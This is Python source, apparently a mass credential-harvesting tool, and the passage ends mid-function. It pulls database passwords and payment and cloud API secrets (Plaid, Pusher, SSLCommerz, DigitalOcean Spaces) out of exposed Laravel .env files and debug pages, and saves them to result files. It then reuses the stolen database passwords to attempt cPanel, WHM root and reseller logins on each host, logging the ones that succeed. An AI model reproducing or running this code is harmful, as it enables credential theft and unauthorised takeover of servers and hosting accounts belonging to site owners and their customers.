import os
import time
import random
import colored
from colored import fg, bg, attr
from re import findall as reg
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from multiprocessing.pool import ThreadPool

TOTAL_DB = 0
TOTAL_DO_SPACES = 0
TOTAL_RT_PLAID = 0
TOTAL_PUSHER = 0
TOTAL_SSLCZ_STORE = 0
TOTAL_PAYSTACK = 0
TOTAL_INSTAMOJO = 0
TOTAL_PAYTM = 0
TOTAL_STRIPE = 0
TOTAL_NEXMO = 0
TOTAL_TWILIO = 0
TOTAL_MAILCHIMP = 0
TOTAL_SMTP = 0
TOTAL_AWS_KEY = 0
TOTAL_CP = 0
TOTAL_ROOT = 0
TOTAL_RS = 0
TOTAL_SHELLS = 0

def GET_DB(IP_, SRC_, URL_, METHOD_):
	global TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS
	DB_CONNECTION = ""; DB_HOST = ""; DB_PORT = ""; DB_DATABASE = ""; DB_USERNAME = ""; DB_PASSWORD = "";
	# ////////////////////////////////////////////////////////////////
	if METHOD_ == "[/.ENV]":
		if "DB_HOST=" in SRC_ and "DB_PORT=" in SRC_:
			if "DB_CONNECTION=" in SRC_: DB_CONNECTION = SRC_.split("DB_CONNECTION=")[1].split("\n")[0]
			if "DB_CONNECTION =" in SRC_: DB_CONNECTION = SRC_.split("DB_CONNECTION =")[1].split("\n")[0]
			if "DB_HOST=" in SRC_: DB_HOST = SRC_.split("DB_HOST=")[1].split("\n")[0]
			if "DB_HOST =" in SRC_: DB_HOST = SRC_.split("DB_HOST =")[1].split("\n")[0]
			if "DB_PORT=" in SRC_: DB_PORT = SRC_.split("DB_PORT=")[1].split("\n")[0]
			if "DB_PORT =" in SRC_: DB_PORT = SRC_.split("DB_PORT =")[1].split("\n")[0]
			if "DB_DATABASE=" in SRC_: DB_DATABASE = SRC_.split("DB_DATABASE=")[1].split("\n")[0]
			if "DB_DATABASE =" in SRC_: DB_DATABASE = SRC_.split("DB_DATABASE =")[1].split("\n")[0]
			if "DB_USERNAME=" in SRC_: DB_USERNAME = SRC_.split("DB_USERNAME=")[1].split("\n")[0]
			if "DB_USERNAME =" in SRC_: DB_USERNAME = SRC_.split("DB_USERNAME =")[1].split("\n")[0]
			if "DB_PASSWORD=" in SRC_: DB_PASSWORD = SRC_.split("DB_PASSWORD=")[1].split("\n")[0]
			if "DB_PASSWORD =" in SRC_: DB_PASSWORD = SRC_.split("DB_PASSWORD =")[1].split("\n")[0]
			TEMP = "URL: {}\nMETHOD: {}\nDB_CONNECTION: {}\nDB_HOST: {}\nDB_PORT: {}\nDB_DATABASE: {}\nDB_USERNAME: {}\nDB_PASSWORD: {}\n===================================\n\n".format(URL_, METHOD_, DB_CONNECTION, DB_HOST, DB_PORT, DB_DATABASE, DB_USERNAME, DB_PASSWORD)
			DB_FILE = open("Rzlts/DB.txt", "a+")
			DB_FILE.write(TEMP)
			DB_FILE.close()
			TOTAL_DB+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	elif METHOD_ == "[DEBUG]":
		if "<td>DB_HOST</td>" in SRC_ and "<td>DB_PORT</td>" in SRC_:
			try:
				if "DB_CONNECTION" in SRC_: DB_CONNECTION = reg('<td>DB_CONNECTION<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "DB_HOST" in SRC_: DB_HOST = reg('<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "DB_PORT" in SRC_: DB_PORT = reg('<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "DB_DATABASE" in SRC_: DB_DATABASE = reg('<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "DB_USERNAME" in SRC_: DB_USERNAME = reg('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "DB_PASSWORD" in SRC_: DB_PASSWORD = reg('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			TEMP = "URL: {}\nMETHOD: {}\nDB_CONNECTION: {}\nDB_HOST: {}\nDB_PORT: {}\nDB_DATABASE: {}\nDB_USERNAME: {}\nDB_PASSWORD: {}\n===================================\n\n".format(URL_, METHOD_, DB_CONNECTION, DB_HOST, DB_PORT, DB_DATABASE, DB_USERNAME, DB_PASSWORD)
			DB_FILE = open("Rzlts/DB.txt", "a+")
			DB_FILE.write(TEMP)
			DB_FILE.close()
			TOTAL_DB+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	else:
		pass
	# // Checkin If CPANEL / ROOT / RESELLER
	DB_PASSWORD = DB_PASSWORD.replace("'", ""); DB_PASSWORD = DB_PASSWORD.replace('"', '')
	DB_USERNAME = DB_USERNAME.replace("'", ""); DB_USERNAME = DB_USERNAME.replace('"', '')
	if DB_PASSWORD != "" and DB_USERNAME != "":
		headers = {
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"Cookie": "cpsession=%3at0I9_tBULFYKxQka%2ce67d3124a3025cdf7d928d1f7668dddf; timezone=Africa/Cairo",
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
		}
		#print "It Is CPANEL http://{}:2083".format(IP_)
		#SAVE_WHOLE = open("WHOLE_CPANELS.txt", "a+")
		#SAVE_WHOLE.write("http://{}:2083\n".format(IP_))
		#SAVE_WHOLE.close()
		CPANEL_Login_URL_ = "https://{}:2083/login/?login_only=1&user={}&pass={}&goto_uri=%2F".format(IP_, DB_USERNAME, DB_PASSWORD)
		WHM_Login_URL_ = "https://{}:2087/login/?login_only=1&user=root&pass={}&goto_uri=%2F".format(IP_, DB_PASSWORD)
		RESELLER_Login_URL_ = "https://{}:2087/login/?login_only=1&user={}&pass={}&goto_uri=%2F".format(IP_, DB_USERNAME, DB_PASSWORD)
		try:
			MM = requests.get("http://{}:2083".format(IP_), headers=headers, allow_redirects=True, verify=False, timeout=6).content
			if "<title>cPanel Login</title>" in MM:
				try:
					rCP = requests.get(CPANEL_Login_URL_, headers=headers, allow_redirects=True, verify=False, timeout=6).content
					#print rCP
					if 'redirect' in rCP and 'security_token' in rCP:
						CPANEL_ = "https://{}:2083|{}|{}".format(IP_, DB_USERNAME, DB_PASSWORD)
						#print CPANEL_
						SAVE_CP = open("Rzlts/Cpanel.txt", "a+")
						SAVE_CP.write(CPANEL_+"\n")
						SAVE_CP.close()
						TOTAL_CP+=1
						os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
				except:
					pass
		except:
			pass
		try:
			MMM = requests.get("http://{}:2087".format(IP_), headers=headers, allow_redirects=True, verify=False, timeout=6).content
			if "<title>WHM Login</title>" in MMM:
				try:
					rWHM = requests.get(WHM_Login_URL_, headers=headers, allow_redirects=True, verify=False, timeout=6).content
					#print rWHM
					if 'redirect' in rWHM and 'security_token' in rWHM:
						WHM_ = "https://{}:2087|root|{}".format(IP_, DB_PASSWORD)
						#print WHM_
						SAVE_WHM = open("Rzlts/Root.txt", "a+")
						SAVE_WHM.write(WHM_+"\n")
						SAVE_WHM.close()
						TOTAL_ROOT+=1
						os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
					rRES = requests.get(RESELLER_Login_URL_, headers=headers, allow_redirects=True, verify=False, timeout=6).content
					#print rRES
					if 'redirect' in rRES and 'security_token' in rRES:
						RESELLER_ = "https://{}:2087|{}|{}".format(IP_, DB_USERNAME, DB_PASSWORD)
						#print RESELLER_
						SAVE_RESELLER = open("Rzlts/Reseller.txt", "a+")
						SAVE_RESELLER.write(RESELLER_+"\n")
						SAVE_RESELLER.close()
						TOTAL_RS+=1
						os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
				except:
					pass
		except:
			pass
	# ////////////////////////////////////////////////////////////////
	# ////////////////////////////////////////////////////////////////


def GET_DO_SPACES(SRC_, URL_, METHOD_):
	global TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS
	DO_SPACES_KEY = ""; DO_SPACES_SECRET = ""; DO_SPACES_ENDPOINT = "";
	# ////////////////////////////////////////////////////////////////
	if METHOD_ == "[/.ENV]":
		if "DO_SPACES_KEY=" in SRC_ and "DO_SPACES_SECRET=" in SRC_:
			if "DO_SPACES_KEY" in SRC_: DO_SPACES_KEY = SRC_.split("DO_SPACES_KEY=")[1].split("\n")[0]
			if "DO_SPACES_SECRET" in SRC_: DO_SPACES_SECRET = SRC_.split("DO_SPACES_SECRET=")[1].split("\n")[0]
			if "DO_SPACES_ENDPOINT" in SRC_: DO_SPACES_ENDPOINT = SRC_.split("DO_SPACES_ENDPOINT=")[1].split("\n")[0]
			TEMP = "URL: {}\nMETHOD: {}\nDO_SPACES_KEY: {}\nDO_SPACES_SECRET: {}\nDO_SPACES_ENDPOINT: {}\n===================================\n\n".format(URL_, METHOD_, DO_SPACES_KEY, DO_SPACES_SECRET, DO_SPACES_ENDPOINT)
			DO_SPACES = open("Rzlts/DO_SPACES.txt", "a+")
			DO_SPACES.write(TEMP)
			DO_SPACES.close()
			TOTAL_DO_SPACES+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	elif METHOD_ == "[DEBUG]":
		if "<td>DO_SPACES_KEY</td>" in SRC_ and "<td>DO_SPACES_SECRET</td>" in SRC_:
			try: 
				if "<td>DO_SPACES_KEY</td>" in SRC_: DO_SPACES_KEY = reg('<td>DO_SPACES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try: 
				if "<td>DO_SPACES_SECRET</td>" in SRC_: DO_SPACES_SECRET = reg('<td>DO_SPACES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try: 
				if "<td>DO_SPACES_ENDPOINT</td>" in SRC_: DO_SPACES_ENDPOINT = reg('<td>DO_SPACES_ENDPOINT<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			TEMP = "URL: {}\nMETHOD: {}\nDO_SPACES_KEY: {}\nDO_SPACES_SECRET: {}\nDO_SPACES_ENDPOINT: {}\n===================================\n\n".format(URL_, METHOD_, DO_SPACES_KEY, DO_SPACES_SECRET, DO_SPACES_ENDPOINT)
		else:
			pass
	else:
		pass
	if DO_SPACES_KEY == "" or DO_SPACES_SECRET == "":
		pass
	else:
		DO_SPACES = open("Rzlts/DO_SPACES.txt", "a+")
		DO_SPACES.write(TEMP)
		DO_SPACES.close()
		TOTAL_DO_SPACES+=1
		os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
	# ////////////////////////////////////////////////////////////////
	# ////////////////////////////////////////////////////////////////


def GET_RT_PLAID(SRC_, URL_, METHOD_):
	global TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS
	RT_PLAID_CLIENT_ID = ""; RT_PLAID_SECRET = ""; RT_PLAID_ENV = "";
	# ////////////////////////////////////////////////////////////////
	if METHOD_ == "[/.ENV]":
		if "RT_PLAID_CLIENT_ID=" in SRC_ and "RT_PLAID_SECRET=" in SRC_:
			if "RT_PLAID_CLIENT_ID" in SRC_: RT_PLAID_CLIENT_ID = SRC_.split("RT_PLAID_CLIENT_ID=")[1].split("\n")[0]
			if "RT_PLAID_SECRET" in SRC_: RT_PLAID_SECRET = SRC_.split("RT_PLAID_SECRET=")[1].split("\n")[0]
			if "RT_PLAID_ENV" in SRC_: RT_PLAID_ENV = SRC_.split("RT_PLAID_ENV=")[1].split("\n")[0]
			TEMP = "URL: {}\nMETHOD: {}\nRT_PLAID_CLIENT_ID: {}\nRT_PLAID_SECRET: {}\nRT_PLAID_ENV: {}\n===================================\n\n".format(URL_, METHOD_, RT_PLAID_CLIENT_ID, RT_PLAID_SECRET, RT_PLAID_ENV)
			RT_PLAID = open("Rzlts/RT_PLAID.txt", "a+")
			RT_PLAID.write(TEMP)
			RT_PLAID.close()
			TOTAL_RT_PLAID+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	elif METHOD_ == "[DEBUG]":
		if "<td>RT_PLAID_CLIENT_ID</td>" in SRC_ and "<td>RT_PLAID_SECRET</td>" in SRC_:
			try: 
				if "RT_PLAID_CLIENT_ID" in SRC_: RT_PLAID_CLIENT_ID = reg('<td>RT_PLAID_CLIENT_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try: 
				if "RT_PLAID_SECRET" in SRC_: RT_PLAID_SECRET = reg('<td>RT_PLAID_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try: 
				if "RT_PLAID_ENV" in SRC_: RT_PLAID_ENV = reg('<td>RT_PLAID_ENV<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			TEMP = "URL: {}\nMETHOD: {}\nRT_PLAID_CLIENT_ID: {}\nRT_PLAID_SECRET: {}\nRT_PLAID_ENV: {}\n===================================\n\n".format(URL_, METHOD_, RT_PLAID_CLIENT_ID, RT_PLAID_SECRET, RT_PLAID_ENV)
			RT_PLAID = open("Rzlts/RT_PLAID.txt", "a+")
			RT_PLAID.write(TEMP)
			RT_PLAID.close()
			TOTAL_RT_PLAID+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	else:
		pass

	# ////////////////////////////////////////////////////////////////
	# ////////////////////////////////////////////////////////////////


def GET_PUSHER(SRC_, URL_, METHOD_):
	global TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS
	PUSHER_APP_ID = ""; PUSHER_APP_KEY = ""; PUSHER_APP_SECRET = ""; PUSHER_APP_CLUSTER = ""; MIX_PUSHER_APP_KEY = ""; MIX_PUSHER_APP_CLUSTER = "";
	# ////////////////////////////////////////////////////////////////
	if METHOD_ == "[/.ENV]":
		if "PUSHER_APP_ID=" in SRC_ and "PUSHER_APP_KEY=" in SRC_:
			if "PUSHER_APP_ID" in SRC_: PUSHER_APP_ID = SRC_.split("PUSHER_APP_ID=")[1].split("\n")[0]
			if "PUSHER_APP_KEY" in SRC_: PUSHER_APP_KEY = SRC_.split("PUSHER_APP_KEY=")[1].split("\n")[0]
			if "PUSHER_APP_SECRET" in SRC_: PUSHER_APP_SECRET = SRC_.split("PUSHER_APP_SECRET=")[1].split("\n")[0]
			if "PUSHER_APP_CLUSTER" in SRC_: PUSHER_APP_CLUSTER = SRC_.split("PUSHER_APP_CLUSTER=")[1].split("\n")[0]
			if "MIX_PUSHER_APP_KEY" in SRC_: MIX_PUSHER_APP_KEY = SRC_.split("MIX_PUSHER_APP_KEY=")[1].split("\n")[0]
			if "MIX_PUSHER_APP_CLUSTER" in SRC_: MIX_PUSHER_APP_CLUSTER = SRC_.split("MIX_PUSHER_APP_CLUSTER=")[1].split("\n")[0]
			TEMP = "URL: {}\nMETHOD: {}\nPUSHER_APP_ID: {}\nPUSHER_APP_KEY: {}\nPUSHER_APP_SECRET: {}\nPUSHER_APP_CLUSTER: {}\nMIX_PUSHER_APP_KEY: {}\nMIX_PUSHER_APP_CLUSTER: {}\n===================================\n\n".format(URL_, METHOD_, PUSHER_APP_ID, PUSHER_APP_KEY, PUSHER_APP_SECRET, PUSHER_APP_CLUSTER, MIX_PUSHER_APP_KEY, MIX_PUSHER_APP_CLUSTER)
			PUSHER = open("Rzlts/PUSHER.txt", "a+")
			PUSHER.write(TEMP)
			PUSHER.close()
			TOTAL_PUSHER+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	elif METHOD_ == "[DEBUG]":
		if "<td>PUSHER_APP_ID</td>" in SRC_ and "<td>PUSHER_APP_KEY</td>" in SRC_:
			try:
				if "PUSHER_APP_ID" in SRC_: PUSHER_APP_ID = reg('<td>PUSHER_APP_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "PUSHER_APP_KEY" in SRC_: PUSHER_APP_KEY = reg('<td>PUSHER_APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "PUSHER_APP_SECRET" in SRC_: PUSHER_APP_SECRET = reg('<td>PUSHER_APP_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "PUSHER_APP_CLUSTER" in SRC_: PUSHER_APP_CLUSTER = reg('<td>PUSHER_APP_CLUSTER<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "MIX_PUSHER_APP_KEY" in SRC_: MIX_PUSHER_APP_KEY = reg('<td>MIX_PUSHER_APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "MIX_PUSHER_APP_CLUSTER" in SRC_: MIX_PUSHER_APP_CLUSTER = reg('<td>MIX_PUSHER_APP_CLUSTER<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			TEMP = "URL: {}\nMETHOD: {}\nPUSHER_APP_ID: {}\nPUSHER_APP_KEY: {}\nPUSHER_APP_SECRET: {}\nPUSHER_APP_CLUSTER: {}\nMIX_PUSHER_APP_KEY: {}\nMIX_PUSHER_APP_CLUSTER: {}\n===================================\n\n".format(URL_, METHOD_, PUSHER_APP_ID, PUSHER_APP_KEY, PUSHER_APP_SECRET, PUSHER_APP_CLUSTER, MIX_PUSHER_APP_KEY, MIX_PUSHER_APP_CLUSTER)
			PUSHER = open("Rzlts/PUSHER.txt", "a+")
			PUSHER.write(TEMP)
			PUSHER.close()
			TOTAL_PUSHER+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	else:
		pass
	# ////////////////////////////////////////////////////////////////
	# ////////////////////////////////////////////////////////////////


def GET_SSLCZ_STORE(SRC_, URL_, METHOD_):
	global TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS
	SSLCZ_STORE_ID = ""; SSLCZ_STORE_PASSWD = "";
	# ////////////////////////////////////////////////////////////////
	if METHOD_ == "[/.ENV]":
		if "SSLCZ_STORE_ID=" in SRC_ and "SSLCZ_STORE_PASSWD=" in SRC_:
			if "SSLCZ_STORE_ID" in SRC_: SSLCZ_STORE_ID = SRC_.split("SSLCZ_STORE_ID=")[1].split("\n")[0]
			if "SSLCZ_STORE_PASSWD" in SRC_: SSLCZ_STORE_PASSWD = SRC_.split("SSLCZ_STORE_PASSWD=")[1].split("\n")[0]
			TEMP = "URL: {}\nMETHOD: {}\nSSLCZ_STORE_ID: {}\nSSLCZ_STORE_PASSWD: {}\n===================================\n\n".format(URL_, METHOD_, SSLCZ_STORE_ID, SSLCZ_STORE_PASSWD)
			SSLCZ_STORE = open("Rzlts/SSLCZ_STORE.txt", "a+")
			SSLCZ_STORE.write(TEMP)
			SSLCZ_STORE.close()
			TOTAL_SSLCZ_STORE+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	elif METHOD_ == "[DEBUG]":
		if "<td>SSLCZ_STORE_ID</td>" in SRC_ and "<td>SSLCZ_STORE_PASSWD</td>" in SRC_:
			try:
